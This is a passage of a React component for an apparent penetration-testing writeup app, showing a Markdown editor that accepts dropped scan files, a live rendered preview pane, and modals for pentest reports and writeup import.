              {editorContent.length} chars · {editorContent.split('\n').length} lines
            </span>
          </div>

          <div
            className="flex-1 relative flex flex-col min-h-0"
            onDragOver={(e) => {
              e.preventDefault();
              setIsEditorDragging(true);
            }}
            onDragLeave={() => setIsEditorDragging(false)}
            onDrop={handleEditorDrop}
          >
            {isEditorDragging && (
              <div className="absolute inset-0 bg-cyan-500/10 dark:bg-cyber-cyan/15 backdrop-blur-sm border-2 border-dashed border-cyan-500 dark:border-cyber-cyan z-20 flex flex-col items-center justify-center pointer-events-none p-4 text-center">
                <Upload className="w-8 h-8 text-cyan-600 dark:text-cyber-cyan animate-bounce mb-2" />
                <span className="text-slate-900 dark:text-white text-xs font-bold uppercase tracking-wider">
                  Drop Scan (Nmap / XML / Rustscan) or Markdown File
                </span>
                <span className="text-slate-600 dark:text-cyber-muted text-[10px] mt-1">
                  Recon intelligence and notes will automatically parse and merge into this writeup
                </span>
              </div>
            )}

            <textarea
              id="writeup-markdown-editor"
              name="writeup-markdown-editor"
              aria-label="Markdown report editor"
              value={editorContent}
              onChange={handleEditorChange}
              onBlur={handleEditorBlur}
              placeholder="Write your penetration testing report, paste scans, or drop files here..."
              className="flex-1 w-full p-4 bg-slate-50 dark:bg-cyber-bg text-slate-900 dark:text-cyber-text font-mono text-xs focus:outline-none resize-none leading-relaxed overflow-y-auto"
              spellCheck={false}
            />
          </div>
        </div>

        {/* Right Pane: Live Rendered Preview */}
        <div className="flex flex-col rounded-xl border border-slate-200 dark:border-cyber-border bg-white dark:bg-cyber-card overflow-hidden shadow-lg">
          <div className="flex items-center justify-between border-b border-slate-200 dark:border-cyber-border px-4 py-2.5 bg-slate-50 dark:bg-cyber-bg/70 text-xs">
            <span className="font-bold text-slate-900 dark:text-white flex items-center gap-2">
              <Eye className="w-4 h-4 text-emerald-600 dark:text-cyber-emerald" /> LIVE RENDERED PREVIEW
            </span>
            <span className="text-[10px] text-emerald-700 dark:text-cyber-emerald font-semibold flex items-center gap-1">
              <BookOpen className="w-3 h-3" /> OBSIDIAN PREVIEW
            </span>
          </div>

          <div className="flex-1 p-5 overflow-y-auto max-h-[calc(100vh-280px)] bg-slate-50/50 dark:bg-cyber-card/40">
            {renderMarkdownPreview(editorContent)}
          </div>
        </div>

      </div>

      {/* Executive Pentest Report Modal */}
      <PentestReportModal
        machine={selectedMachine || machines[0] || null}
        isOpen={reportModalOpen}
        onClose={() => setReportModalOpen(false)}
      />

      {/* Writeup Import & Machine Sync Modal */}
      {selectedMachine && (
        <WriteupImportModal
          isOpen={importModalOpen}
          onClose={() => setImportModalOpen(false)}
          machine={selectedMachine}
          currentMarkdown={editorContent}
          onApplyMarkdown={(newMd) => {
            setEditorContent(newMd);
            updateMachine(selectedMachine.id, { writeupMarkdown: newMd });
          }}
        />
      )}
    </div>
  );
};
